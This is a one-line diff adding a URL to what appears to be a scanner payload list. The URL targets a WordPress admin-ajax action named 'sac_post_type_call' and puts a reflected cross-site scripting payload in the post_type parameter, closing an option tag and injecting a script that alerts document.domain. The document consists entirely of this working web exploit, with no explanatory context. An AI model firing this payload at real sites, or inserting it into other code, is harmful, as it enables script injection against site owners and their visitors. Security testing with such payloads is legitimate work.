@@ -1,0 +1,1 @@
+/wp-admin/admin-ajax.php?action=sac_post_type_call&post_type=</option><script>alert(document.domain)</script>
